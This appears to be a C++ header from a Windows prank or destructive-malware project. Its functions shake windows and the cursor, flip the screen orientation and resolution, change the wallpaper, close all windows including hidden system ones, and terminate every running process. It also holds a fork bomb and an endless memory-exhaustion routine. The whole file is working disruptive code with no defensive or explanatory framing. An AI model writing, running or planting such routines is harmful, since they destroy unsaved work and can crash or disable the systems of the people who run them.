#pragma once

#include <thread>
#include <random>
#include <string>
#include "timer.h"
#include "callbacks.h"
#include <Tlhelp32.h>

static std::mt19937 gen1;
static std::mt19937 gen2([]() { LARGE_INTEGER li; QueryPerformanceCounter(&li); return uint32_t(li.QuadPart); }());

static std::uniform_int_distribution dist(-20, 20);

class __memcrasher
{
public:
	__memcrasher() : arr{ new uint64_t[0b11111111111111111] } {}

private:
	uint64_t* arr;
};

void ShakeWindow(HWND hwnd, double intensity = 1.0)
{
	WINDOWPLACEMENT wp{};
	wp.length = sizeof(WINDOWPLACEMENT);
	GetWindowPlacement(hwnd, &wp);

	if (IsWindowVisible(hwnd) && wp.showCmd == SW_MAXIMIZE)
		ShowWindow(hwnd, SW_RESTORE);

	RECT rect;
	GetWindowRect(hwnd, &rect);

	rect.left	+= static_cast<int>(dist(gen1) * intensity);
	rect.top	+= static_cast<int>(dist(gen2) * intensity);

	SetWindowPos(hwnd, NULL, rect.left, rect.top, NULL, NULL, SWP_NOZORDER | SWP_NOACTIVATE | SWP_NOSIZE);
}

void ShakeWindow(HWND hwnd, int x, int y)
{
	WINDOWPLACEMENT wp{};
	wp.length = sizeof(WINDOWPLACEMENT);
	GetWindowPlacement(hwnd, &wp);

	if (wp.showCmd == SW_MAXIMIZE)
		ShowWindow(hwnd, SW_RESTORE);

	RECT rect;
	GetWindowRect(hwnd, &rect);

	rect.left	+= x;
	rect.top	+= y;

	SetWindowPos(hwnd, NULL, rect.left, rect.top, NULL, NULL, SWP_NOZORDER | SWP_NOACTIVATE | SWP_NOSIZE);
}

void ShakeMouse(double intensity = 1.0)
{
	POINT mouse;
	GetCursorPos(&mouse);

	mouse.x += int(dist(gen1) * intensity);
	mouse.y += int(dist(gen2) * intensity);

	SetCursorPos(mouse.x, mouse.y);
}

void ShakeMouse(int x, int y)
{
	POINT mouse;
	GetCursorPos(&mouse);

	mouse.x += x;
	mouse.y += y;

	SetCursorPos(mouse.x, mouse.y);
}

/* Shakes everything (including the cursor), except the movement is aligned,
   thus simulating an earthquake effect. */
void Earthquake(double duration, double intensity = 1.0, unsigned delay = 0U)
{
	const Timer timer;

	std::vector<HWND> windows;
	EnumWindows(PushActiveWindows, LPARAM(&windows));

	while (timer <= duration)
	{
		const int x { int(dist(gen1) * intensity) };
		const int y { int(dist(gen2) * intensity) };

		for (HWND& hwnd : windows)
			ShakeWindow(hwnd, x, y);

		ShakeMouse(x, y);
		Sleep(delay);
	}
}

void CloseWindowByName(LPCTSTR name)
{
	PostMessage(FindWindow(NULL, name), WM_CLOSE, NULL, NULL);
}

/* Closes all windows. If <unsafe>, hidden (possibly system) windows are not-so-safely closed as well. */
void CloseAllWindows(bool unsafe = false)
{
	std::vector<HWND> windows;
	EnumWindows(unsafe ? PushAllWindows : PushActiveWindows, LPARAM(&windows));

	for (HWND& hwnd : windows)
		unsafe ? SendMessage(hwnd, WM_DESTROY, NULL, NULL) : PostMessage(hwnd, WM_CLOSE, NULL, NULL);
}

void CloseAllProcesses()
{
	const HANDLE snapshot { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL) };

	PROCESSENTRY32 pe {};
	pe.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(snapshot, &pe))
	{
		do
		{
			const HANDLE hProcess { OpenProcess(PROCESS_TERMINATE, NULL, DWORD(pe.th32ProcessID)) };

			if (hProcess)
			{
				TerminateProcess(hProcess, NULL);
				CloseHandle(hProcess);
			}
		}

		while (Process32Next(snapshot, &pe));
		CloseHandle(snapshot);
	}
}

void SetScreenOrientation(DWORD orientation)
{
	DEVMODE dm {};
	dm.dmSize = sizeof(DEVMODE);

	EnumDisplaySettingsEx(NULL, ENUM_CURRENT_SETTINGS, &dm, EDS_RAWMODE);

	dm.dmDisplayOrientation = orientation;

	DISPLAY_DEVICE dd {};
	dd.cb = sizeof(DISPLAY_DEVICE);

	for (uint8_t i{ 0 }; EnumDisplayDevices(NULL, i, &dd, NULL); i += 1)
		ChangeDisplaySettingsEx(dd.DeviceName, &dm, NULL, NULL, NULL);
}

DWORD GetScreenOrientation()
{
	DEVMODE dm {};
	dm.dmSize = sizeof(DEVMODE);

	EnumDisplaySettingsEx(NULL, ENUM_CURRENT_SETTINGS, &dm, EDS_RAWMODE);

	return dm.dmDisplayOrientation;
}

void SetScreenResolution(DWORD width, DWORD height)
{
	DEVMODE dm {};
	dm.dmSize = sizeof(DEVMODE);

	EnumDisplaySettingsEx(NULL, ENUM_CURRENT_SETTINGS, &dm, EDS_RAWMODE);

	dm.dmPelsWidth = width;
	dm.dmPelsHeight = height;

	DISPLAY_DEVICE dd {};
	dd.cb = sizeof(DISPLAY_DEVICE);

	for (uint8_t i{ 0 }; EnumDisplayDevices(NULL, i, &dd, NULL); i += 1)
		ChangeDisplaySettingsEx(dd.DeviceName, &dm, NULL, NULL, NULL);

}

void LoopFlipScreen(double duration, unsigned delay = 100U, bool reset_on_end = true)
{
	const Timer timer;

	while (timer <= duration)
	{
		SetScreenOrientation(!bool(GetScreenOrientation()) * 2);
		Sleep(delay);
	}

	if (reset_on_end)
		SetScreenOrientation(DMDO_DEFAULT);
}

void SetWallpaper(const char* path)
{
	char rel_path[MAX_PATH];
	GetModuleFileNameA(NULL, rel_path, MAX_PATH);

	std::string pth { rel_path };

	SystemParametersInfoA(SPI_SETDESKWALLPAPER, 1, (PVOID)(pth.substr(0, pth.find_last_of("\\/")) += (std::string("\\") += path)).c_str(), SPIF_SENDCHANGE | SPIF_UPDATEINIFILE);
}

/* Waits for <delay> seconds before running a fork bomb. */
void ForkBomb(double delay = 0.0)
{
	const Timer timer;
	while (timer <= delay) {}

	std::thread(ForkBomb, 0.0).join();
}


void MemCrash(double delay = 0.0)
{
	const Timer timer;
	while (timer <= delay) {}

	while (true)
	{
		try {
			__memcrasher* fbc{ new __memcrasher };
		}

		catch (std::bad_alloc& ba) // purposefully do absolutely nothing when allocation fails
		{

		}
	}
		
}
